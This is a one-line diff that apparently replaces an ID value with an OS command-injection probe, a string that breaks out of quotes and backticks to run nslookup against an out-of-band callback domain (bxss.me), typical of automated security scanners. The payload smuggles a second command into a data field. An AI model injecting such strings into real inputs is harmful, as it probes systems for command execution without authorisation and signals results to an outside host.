@@ -1,1 +1,1 @@
-MO_557267801129_000
+&nslookup -q=cname hitomcsqdnpre727e8.bxss.me&'\"`0&nslookup -q=cname hitomcsqdnpre727e8.bxss.me&`'
